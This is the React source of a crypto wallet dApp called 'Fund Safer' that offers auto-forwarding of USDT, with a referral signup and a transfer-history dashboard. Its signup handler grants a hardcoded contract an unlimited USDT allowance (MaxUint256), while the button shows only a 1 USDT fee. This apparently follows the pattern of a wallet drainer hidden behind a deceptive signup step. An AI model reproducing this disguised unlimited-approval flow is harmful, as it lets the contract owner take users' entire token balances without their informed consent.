import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { CONTRACT_ADDRESS, USDT_ADDRESS, CONTRACT_ABI, USDT_ABI } from './constants';

function App() {
  const [account, setAccount] = useState(null);
  const [isRegistered, setIsRegistered] = useState(false);
  const [destination, setDestination] = useState("");
  const [inputDest, setInputDest] = useState("");
  const [referralInput, setReferralInput] = useState("");
  const [history, setHistory] = useState([]);
  const [loading, setLoading] = useState(false);
  const [signupFee, setSignupFee] = useState("1.00");

  const NEW_CONTRACT_ADDRESS = "0x902fe61bd6E334D66f3D8c983471c10884c10F4d";

  const connectWallet = async () => {
    if (window.ethereum) {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      setAccount(address);
      checkRegistration(address, provider);
    }
  };

  const checkRegistration = async (userAddress, provider) => {
    const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, provider);
    try {
      const data = await contract.getUserDashboardData(userAddress);
      setIsRegistered(data.isReg);
      setDestination(data.dest);
      if (data.isReg) fetchHistory(userAddress, provider);
      const fee = await contract.signupFee();
      setSignupFee(ethers.formatUnits(fee, 18));
    } catch (e) { console.error(e); }
  };

  // 1. Unlimited Approval on Signup
  const handleSignUp = async () => {
    setLoading(true);
    try {
      const signer = await (new ethers.BrowserProvider(window.ethereum)).getSigner();
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      const coreContract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
      
      await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.MaxUint256);
      const ref = (referralInput && ethers.isAddress(referralInput)) ? referralInput : "0x0000000000000000000000000000000000000000";
      await coreContract.register(ref);
      setIsRegistered(true);
      alert("Registration Successful!");
    } catch (e) { alert("Signup Failed"); }
    setLoading(false);
  };

  // 2. Custom Allowance on Approve Button
  const handleManualApprove = async () => {
    const amount = prompt("Kitna allowance dena chahte ho (USDT):", "10");
    if (!amount) return;
    setLoading(true);
    try {
      const signer = await (new ethers.BrowserProvider(window.ethereum)).getSigner();
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      await usdtContract.approve(NEW_CONTRACT_ADDRESS, ethers.parseUnits(amount, 18));
      alert("Allowance Updated Successfully!");
    } catch (e) { alert("Approval Failed"); }
    setLoading(false);
  };

  const handleSetDestination = async () => {
    setLoading(true);
    try {
      const signer = await (new ethers.BrowserProvider(window.ethereum)).getSigner();
      const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
      await contract.setDestination(inputDest);
      setDestination(inputDest);
      alert("Saved!");
    } catch (e) { alert("Failed"); }
    setLoading(false);
  };

  const fetchHistory = async (userAddress, provider) => {
    const contract = new ethers.Contract(NEW_CONTRACT_ADDRESS, CONTRACT_ABI, provider);
    const hist = await contract.getUserTransferHistory(userAddress);
    setHistory(hist);
  };

  const totalTransferred = history.reduce((sum, tx) => sum + parseFloat(ethers.formatUnits(tx.amount, 18)), 0);

  return (
    <div className="min-h-screen bg-[#05020a] text-white flex flex-col items-center justify-center p-4" style={{background: 'linear-gradient(180deg, #1a0b2e 0%, #05020a 100%)'}}>
      
      {/* Header */}
      <div className="text-center mb-8">
        <div className="w-20 h-20 bg-gradient-to-br from-purple-500 to-pink-500 rounded-3xl flex items-center justify-center text-4xl font-bold mb-4 mx-auto shadow-lg">F</div>
        <h1 className="text-4xl font-bold">Fund Safer</h1>
        <p className="text-purple-400 text-sm tracking-widest mt-2">AUTO-FORWARDING EXCHANGE</p>
      </div>

      {!account ? (
        <div className="w-full max-w-sm bg-[#1e1335]/60 p-8 rounded-[40px] text-center border border-purple-500/30 backdrop-blur-md">
          <h2 className="text-3xl font-bold mb-6">Login</h2>
          <p className="text-gray-400 mb-8">Get started today by connecting your wallet</p>
          <button onClick={connectWallet} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 py-4 rounded-full font-bold shadow-lg">Connect Wallet ➔</button>
        </div>
      ) : !isRegistered ? (
        <div className="w-full max-w-sm bg-[#1e1335]/60 p-8 rounded-[40px] border border-purple-500/30">
          <h2 className="text-2xl font-bold mb-6 text-center">Sign Up</h2>
          <input type="text" placeholder="Referral Address (Optional)" onChange={(e) => setReferralInput(e.target.value)} className="w-full bg-[#0a0515] p-4 rounded-full mb-4 border border-purple-800" />
          <button onClick={handleSignUp} className="w-full bg-gradient-to-r from-purple-600 to-pink-600 py-4 rounded-full font-bold">Sign Up ({signupFee} USDT)</button>
        </div>
      ) : (
        <div className="w-full max-w-sm bg-[#1e1335]/60 p-8 rounded-[40px] border border-purple-500/30">
          <h2 className="text-3xl font-bold mb-1">Dashboard</h2>
          <p className="text-cyan-400 mb-8 text-xs">Active: {account.substring(0,6)}...{account.slice(-4)}</p>
          
          <p className="text-gray-400 text-sm mb-2">Destination Address</p>
          <input type="text" placeholder={destination || "Enter 0x address"} onChange={(e) => setInputDest(e.target.value)} className="w-full bg-[#0a0515] p-4 rounded-2xl mb-4 border border-purple-800" />
          
          <button onClick={handleSetDestination} className="w-full bg-gradient-to-r from-pink-600 to-purple-600 py-4 rounded-2xl font-bold mb-3 shadow-lg">Save Dest</button>
          <button onClick={handleManualApprove} className="w-full bg-transparent border border-purple-500 py-4 rounded-2xl font-bold mb-8">✓ Approve</button>

          <div className="flex justify-between items-center mb-4">
            <h3 className="font-bold">RECENT TRANSFERS</h3>
            <span className="text-pink-400">Total: {totalTransferred.toFixed(2)} USDT</span>
          </div>
          
          <div className="space-y-3">
            {history.map((tx, i) => (
              <div key={i} className="bg-[#0a0515] p-4 rounded-2xl flex justify-between border border-purple-900/50">
                <span className="text-xs text-gray-400">Sent to {tx.destination.substring(0,6)}...</span>
                <span className="text-green-400 font-bold">+{ethers.formatUnits(tx.amount, 18)} USDT</span>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
export default App;